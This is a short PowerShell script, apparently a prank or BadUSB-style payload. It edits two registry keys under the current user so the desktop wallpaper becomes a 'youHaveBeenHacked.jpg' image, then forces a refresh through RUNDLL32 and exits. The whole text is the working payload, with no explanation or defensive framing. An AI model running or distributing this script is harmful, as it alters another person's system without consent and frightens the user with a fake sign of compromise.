$location = Get-Location;
$grabUser = $env:UserName
reg add "HKCU\Control Panel\Desktop" /v WallPaper /d "C:\Users\$grabUser\youHaveBeenHacked.jpg" /f;
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Wallpapers\" /v CurrentWallpaperPath /d "C:\Users\$grabUser\youHaveBeenHacked.jpg" /f;
Start-Sleep -Seconds 35;
RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;
Start-Sleep -Seconds 1;
Exit;